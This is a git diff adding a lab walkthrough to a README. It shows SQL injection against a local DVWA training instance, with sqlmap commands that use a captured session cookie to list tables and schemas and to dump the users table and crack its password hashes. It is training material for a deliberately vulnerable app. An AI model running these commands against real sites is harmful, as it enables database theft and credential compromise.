@@ -25,11 +25,36 @@ password: password
 ```
 
 creat database 
-
 <img src="./PNGs/Screenshot from 2024-05-09 14-21-51.png">
 
+go to SQL injection 
+<img src="./PNGs/Screenshot from 2024-05-09 14-33-51.png>
 
-## Usage
+## SQL Attack
+write any input here
+<img src="./PNGs/Screenshot from 2024-05-09 14-28-15.png">
 
+copy the url and press F12 go to applicateion to cookies
+and save the PHPSESSID and security level 
+<img src="./PNGs/Screenshot from 2024-05-09 14-29-10.png>
 
-<img src="./PNGs/">
+using sqlmap to see all the tables in this web page using this 
+* ##you need to change the url and PHPSESSID
+
+```
+cd cd sqlmap-dev
+sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  
+```
+using sqlmap to see all tables schema using this comand 
+```
+sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  --schema --batch
+```
+using sqlmap to see schema for specific table using this for users table
+``` 
+sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  --schema  --columns -T users --batch 
+```
+
+if u need to see the table content and crack the password hashes using this comand 
+``` 
+sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --dump -T users --batch
+```
